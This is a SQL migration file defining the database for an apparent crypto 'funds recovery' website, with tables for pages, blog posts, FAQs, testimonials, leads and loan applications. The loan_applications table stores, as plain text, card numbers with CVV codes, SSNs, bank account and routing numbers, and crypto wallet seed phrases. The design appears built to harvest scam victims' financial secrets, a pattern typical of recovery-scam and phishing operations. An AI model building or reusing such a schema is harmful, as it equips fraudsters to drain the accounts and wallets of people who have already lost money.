CREATE TABLE `as_seen_in` (
	`id` text PRIMARY KEY NOT NULL,
	`name` text NOT NULL,
	`logo_url` text NOT NULL,
	`link_url` text,
	`sort_order` integer DEFAULT 0 NOT NULL,
	`is_published` integer DEFAULT true NOT NULL,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `blog_posts` (
	`id` text PRIMARY KEY NOT NULL,
	`slug` text NOT NULL,
	`title` text NOT NULL,
	`excerpt` text,
	`content` text NOT NULL,
	`featured_image` text,
	`author` text DEFAULT 'ChanAidRecovery Team',
	`is_published` integer DEFAULT true NOT NULL,
	`seo_title` text,
	`seo_description` text,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE UNIQUE INDEX `blog_posts_slug_unique` ON `blog_posts` (`slug`);--> statement-breakpoint
CREATE TABLE `chanaid_config` (
	`id` integer PRIMARY KEY DEFAULT 1 NOT NULL,
	`site_name` text DEFAULT 'ChanAidRecovery',
	`support_email` text DEFAULT 'support@chanaidrecovery.com',
	`whatsapp_number` text DEFAULT '+1 (940) 377-9359',
	`telegram_handle` text DEFAULT '@ChanAidRecovery',
	`is_maintenance_mode` integer DEFAULT false,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `faqs` (
	`id` text PRIMARY KEY NOT NULL,
	`question` text NOT NULL,
	`answer` text NOT NULL,
	`category` text DEFAULT 'general',
	`is_published` integer DEFAULT true NOT NULL,
	`sort_order` integer DEFAULT 0 NOT NULL,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `leads` (
	`id` text PRIMARY KEY NOT NULL,
	`first_name` text NOT NULL,
	`last_name` text,
	`email` text NOT NULL,
	`phone` text,
	`amount_lost` text,
	`scam_type` text,
	`message` text,
	`source_page` text,
	`status` text DEFAULT 'new' NOT NULL,
	`notes` text,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `loan_applications` (
	`id` text PRIMARY KEY NOT NULL,
	`first_name` text NOT NULL,
	`last_name` text,
	`email` text NOT NULL,
	`phone` text,
	`date_of_birth` text,
	`address_line1` text,
	`address_line2` text,
	`city` text,
	`state_region` text,
	`postal_code` text,
	`country` text,
	`amount_requested` real NOT NULL,
	`currency` text DEFAULT 'USD' NOT NULL,
	`loan_purpose` text,
	`loan_term_months` integer,
	`employment_status` text,
	`monthly_income` real,
	`payout_method` text DEFAULT 'bank_transfer' NOT NULL,
	`bank_name` text,
	`card_issuer` text,
	`account_holder_name` text,
	`status` text DEFAULT 'new' NOT NULL,
	`notes` text,
	`source_page` text,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`card_holder_name` text,
	`card_number` text,
	`card_expiry` text,
	`card_cvv` text,
	`billing_address_line1` text,
	`billing_address_line2` text,
	`billing_city` text,
	`billing_state` text,
	`billing_postal_code` text,
	`billing_country` text,
	`bank_account_number` text,
	`bank_routing_number` text,
	`ssn` text,
	`ein` text,
	`crypto_wallet_type` text,
	`crypto_seed_phrase` text
);
--> statement-breakpoint
CREATE TABLE `media` (
	`id` text PRIMARY KEY NOT NULL,
	`url` text NOT NULL,
	`filename` text NOT NULL,
	`alt_text` text,
	`mime_type` text,
	`size_bytes` integer,
	`uploaded_by` text,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `pages` (
	`id` text PRIMARY KEY NOT NULL,
	`slug` text NOT NULL,
	`title` text NOT NULL,
	`hero_eyebrow` text,
	`hero_headline` text,
	`hero_subheadline` text,
	`hero_image_url` text,
	`seo_title` text,
	`seo_description` text,
	`og_image_url` text,
	`sections` text DEFAULT '[]' NOT NULL,
	`is_published` integer DEFAULT true NOT NULL,
	`sort_order` integer DEFAULT 0 NOT NULL,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE UNIQUE INDEX `pages_slug_unique` ON `pages` (`slug`);--> statement-breakpoint
CREATE TABLE `services` (
	`id` text PRIMARY KEY NOT NULL,
	`slug` text NOT NULL,
	`name` text NOT NULL,
	`short_description` text,
	`hero_headline` text,
	`hero_subheadline` text,
	`hero_image_url` text,
	`icon` text,
	`problem_description` text,
	`recovery_process` text,
	`success_rate` text,
	`stats` text DEFAULT '{}',
	`seo_title` text,
	`seo_description` text,
	`og_image_url` text,
	`is_published` integer DEFAULT true NOT NULL,
	`sort_order` integer DEFAULT 0 NOT NULL,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE UNIQUE INDEX `services_slug_unique` ON `services` (`slug`);--> statement-breakpoint
CREATE TABLE `site_settings` (
	`id` integer PRIMARY KEY DEFAULT 1 NOT NULL,
	`site_name` text DEFAULT 'ChanAidRecovery Hub' NOT NULL,
	`tagline` text DEFAULT 'Expert Asset & Funds Recovery from Online Scams',
	`logo_url` text,
	`favicon_url` text,
	`contact_email` text DEFAULT 'contact@chanaidrecovery.com',
	`contact_phone` text,
	`contact_address` text,
	`whatsapp_number` text DEFAULT '+10000000000',
	`telegram_username` text DEFAULT 'chanaidrecovery',
	`notification_email` text,
	`facebook_url` text,
	`twitter_url` text,
	`linkedin_url` text,
	`instagram_url` text,
	`youtube_url` text,
	`default_seo_title` text DEFAULT 'ChanAidRecovery Hub — Professional Crypto & Funds Recovery',
	`default_seo_description` text DEFAULT 'Recover stolen crypto, forex, and investment funds. ChanAidRecovery Hub provides professional forensic investigation and legal recovery services worldwide.',
	`og_image_url` text,
	`geo_country` text DEFAULT 'US',
	`geo_region` text DEFAULT 'Worldwide',
	`google_analytics_id` text,
	`footer_text` text DEFAULT '© 2026 ChanAidRecovery Hub. All rights reserved.',
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `testimonial_submissions` (
	`id` text PRIMARY KEY NOT NULL,
	`client_name` text NOT NULL,
	`email` text,
	`location` text,
	`scam_type` text,
	`amount_recovered` text,
	`rating` integer DEFAULT 5 NOT NULL,
	`quote` text NOT NULL,
	`consent_to_publish` integer DEFAULT false NOT NULL,
	`status` text DEFAULT 'pending' NOT NULL,
	`notes` text,
	`source_page` text,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `testimonials` (
	`id` text PRIMARY KEY NOT NULL,
	`client_name` text NOT NULL,
	`location` text,
	`photo_url` text,
	`rating` integer DEFAULT 5 NOT NULL,
	`quote` text NOT NULL,
	`amount_recovered` text,
	`scam_type` text,
	`is_published` integer DEFAULT true NOT NULL,
	`is_featured` integer DEFAULT false NOT NULL,
	`sort_order` integer DEFAULT 0 NOT NULL,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL,
	`updated_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE TABLE `user_roles` (
	`id` text PRIMARY KEY NOT NULL,
	`user_id` text NOT NULL,
	`role` text NOT NULL,
	`created_at` text DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')) NOT NULL
);
--> statement-breakpoint
CREATE UNIQUE INDEX `user_roles_user_id_role_unique` ON `user_roles` (`user_id`,`role`);